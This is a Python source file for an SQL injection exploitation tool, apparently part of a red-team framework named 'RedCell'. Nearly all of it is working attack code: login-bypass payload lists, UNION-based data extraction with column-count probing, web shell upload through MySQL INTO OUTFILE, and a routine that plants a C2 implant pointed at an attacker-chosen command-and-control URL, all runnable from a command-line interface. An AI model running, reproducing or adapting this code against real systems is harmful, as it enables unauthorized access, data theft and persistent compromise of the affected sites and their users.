"""
SQL Injection Exploit Module

Automated SQL injection exploitation for initial access.
"""

import requests
import re
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin
import time


class SQLiExploit:
    """
    SQL Injection exploitation framework.

    Features:
    - Authentication bypass
    - Data extraction
    - Command execution (if DB supports)
    - File upload via SQL
    """

    # Common SQL injection payloads
    AUTH_BYPASS_PAYLOADS = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin' --",
        "admin' #",
        "' OR 'a'='a",
        "') OR ('1'='1",
    ]

    # Union-based injection payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
    ]

    def __init__(self, target_url: str, verify_ssl: bool = False):
        """
        Initialize SQL injection exploit.

        Args:
            target_url: Target application URL
            verify_ssl: Verify SSL certificates
        """
        self.target_url = target_url
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_vulnerability(self, endpoint: str, param: str, method: str = 'GET') -> bool:
        """
        Test if parameter is vulnerable to SQL injection.

        Args:
            endpoint: Target endpoint path
            param: Parameter name to test
            method: HTTP method (GET or POST)

        Returns:
            True if vulnerable, False otherwise
        """
        url = urljoin(self.target_url, endpoint)

        # Test with error-based detection
        test_payload = "'"

        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    params={param: test_payload},
                    verify=self.verify_ssl,
                    timeout=10
                )
            else:
                response = self.session.post(
                    url,
                    data={param: test_payload},
                    verify=self.verify_ssl,
                    timeout=10
                )

            # Check for SQL error messages
            sql_errors = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"PostgreSQL.*ERROR",
                r"SQLite.*error",
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"Microsoft SQL Server",
                r"Unclosed quotation mark",
            ]

            for error_pattern in sql_errors:
                if re.search(error_pattern, response.text, re.IGNORECASE):
                    print(f"[+] SQL error detected - parameter '{param}' is vulnerable")
                    return True

        except Exception as e:
            print(f"[-] Error testing vulnerability: {e}")

        return False

    def auth_bypass(
        self,
        login_endpoint: str,
        username_field: str = 'username',
        password_field: str = 'password'
    ) -> Optional[requests.Response]:
        """
        Attempt authentication bypass via SQL injection.

        Args:
            login_endpoint: Login endpoint path
            username_field: Username field name
            password_field: Password field name

        Returns:
            Response object if successful, None otherwise
        """
        url = urljoin(self.target_url, login_endpoint)

        print(f"[*] Attempting SQL injection authentication bypass on {url}")

        for payload in self.AUTH_BYPASS_PAYLOADS:
            data = {
                username_field: payload,
                password_field: 'anything'
            }

            try:
                response = self.session.post(
                    url,
                    data=data,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                    timeout=10
                )

                # Check for successful login indicators
                success_indicators = [
                    response.status_code in [200, 302],
                    'dashboard' in response.text.lower(),
                    'welcome' in response.text.lower(),
                    'logout' in response.text.lower(),
                    'set-cookie' in str(response.headers).lower()
                ]

                if any(success_indicators):
                    print(f"[+] Authentication bypass successful with payload: {payload}")
                    print(f"[+] Status: {response.status_code}")
                    return response

            except Exception as e:
                print(f"[-] Error with payload '{payload}': {e}")

            time.sleep(0.5)  # Rate limiting

        print("[-] Authentication bypass failed")
        return None

    def extract_data(
        self,
        endpoint: str,
        param: str,
        table: str,
        column: str,
        method: str = 'GET'
    ) -> Optional[List[str]]:
        """
        Extract data using UNION-based SQL injection.

        Args:
            endpoint: Target endpoint
            param: Vulnerable parameter
            table: Database table name
            column: Column to extract
            method: HTTP method

        Returns:
            List of extracted data or None
        """
        url = urljoin(self.target_url, endpoint)

        print(f"[*] Attempting to extract data from {table}.{column}")

        # Find number of columns
        num_columns = self._find_column_count(url, param, method)
        if not num_columns:
            print("[-] Could not determine column count")
            return None

        print(f"[+] Found {num_columns} columns")

        # Build UNION payload
        null_columns = ','.join(['NULL'] * num_columns)
        payload = f"' UNION SELECT {null_columns}--"

        # Replace first NULL with our data
        payload = payload.replace('NULL', column, 1)

        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    params={param: payload},
                    verify=self.verify_ssl,
                    timeout=10
                )
            else:
                response = self.session.post(
                    url,
                    data={param: payload},
                    verify=self.verify_ssl,
                    timeout=10
                )

            # Extract data from response (basic pattern matching)
            # This is simplified - real implementation would be more sophisticated
            results = re.findall(r'<td>([^<]+)</td>', response.text)
            if results:
                print(f"[+] Extracted {len(results)} values")
                return results

        except Exception as e:
            print(f"[-] Error extracting data: {e}")

        return None

    def _find_column_count(self, url: str, param: str, method: str) -> Optional[int]:
        """
        Find number of columns using ORDER BY technique.

        Args:
            url: Target URL
            param: Vulnerable parameter
            method: HTTP method

        Returns:
            Number of columns or None
        """
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"

            try:
                if method.upper() == 'GET':
                    response = self.session.get(
                        url,
                        params={param: payload},
                        verify=self.verify_ssl,
                        timeout=10
                    )
                else:
                    response = self.session.post(
                        url,
                        data={param: payload},
                        verify=self.verify_ssl,
                        timeout=10
                    )

                # If we get an error, we've exceeded the column count
                error_patterns = ['Unknown column', 'ORDER BY', 'invalid']
                if any(pattern in response.text for pattern in error_patterns):
                    return i - 1

            except:
                pass

            time.sleep(0.1)

        return None

    def upload_shell(
        self,
        endpoint: str,
        param: str,
        shell_content: str,
        upload_path: str = '/tmp/shell.php'
    ) -> bool:
        """
        Upload web shell via SQL injection (MySQL OUTFILE).

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            shell_content: Shell code to upload
            upload_path: Path to write shell

        Returns:
            True if successful, False otherwise
        """
        url = urljoin(self.target_url, endpoint)

        print(f"[*] Attempting to upload shell to {upload_path}")

        # Build OUTFILE payload
        payload = f"' UNION SELECT '{shell_content}' INTO OUTFILE '{upload_path}'--"

        try:
            response = self.session.get(
                url,
                params={param: payload},
                verify=self.verify_ssl,
                timeout=10
            )

            # Check if shell was written
            if response.status_code == 200:
                print(f"[+] Shell upload attempted - check {upload_path}")
                return True

        except Exception as e:
            print(f"[-] Error uploading shell: {e}")

        return False

    def deploy_implant(
        self,
        endpoint: str,
        param: str,
        c2_url: str,
        implant_path: str = '/tmp/implant.py'
    ) -> bool:
        """
        Deploy C2 implant via SQL injection.

        Args:
            endpoint: Vulnerable endpoint
            param: Vulnerable parameter
            c2_url: C2 server URL
            implant_path: Path to write implant

        Returns:
            True if successful, False otherwise
        """
        # Read implant template
        try:
            with open('c2/implant/basic_implant.py', 'r') as f:
                implant_code = f.read()
        except:
            print("[-] Could not read implant code")
            return False

        # Modify implant to connect to our C2
        implant_code = implant_code.replace(
            'http://127.0.0.1:8443',
            c2_url
        )

        # Upload implant
        if self.upload_shell(endpoint, param, implant_code, implant_path):
            print(f"[+] Implant deployed to {implant_path}")
            print(f"[*] Execute with: python3 {implant_path}")
            return True

        return False


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell SQL Injection Exploit')
    parser.add_argument('target', help='Target URL (e.g., http://target:8080)')
    parser.add_argument('--endpoint', default='/login', help='Endpoint to exploit')
    parser.add_argument('--param', default='username', help='Parameter to exploit')
    parser.add_argument('--test', action='store_true', help='Test for vulnerability')
    parser.add_argument('--bypass', action='store_true', help='Attempt auth bypass')
    parser.add_argument('--extract', help='Extract data (format: table.column)')
    parser.add_argument('--c2', help='Deploy implant with C2 URL')

    args = parser.parse_args()

    exploit = SQLiExploit(args.target)

    if args.test:
        print("[*] Testing for SQL injection vulnerability...")
        if exploit.test_vulnerability(args.endpoint, args.param, 'POST'):
            print("[+] Target is vulnerable!")
        else:
            print("[-] No vulnerability detected")

    elif args.bypass:
        print("[*] Attempting authentication bypass...")
        response = exploit.auth_bypass(args.endpoint)
        if response:
            print("[+] Bypass successful!")
        else:
            print("[-] Bypass failed")

    elif args.extract:
        table, column = args.extract.split('.')
        print(f"[*] Extracting {table}.{column}...")
        data = exploit.extract_data(args.endpoint, args.param, table, column)
        if data:
            print("[+] Extracted data:")
            for item in data:
                print(f"  - {item}")

    elif args.c2:
        print(f"[*] Deploying implant with C2: {args.c2}")
        if exploit.deploy_implant(args.endpoint, args.param, args.c2):
            print("[+] Implant deployed successfully!")
        else:
            print("[-] Deployment failed")

    else:
        print("[-] Please specify an action (--test, --bypass, --extract, or --c2)")


if __name__ == '__main__':
    main()
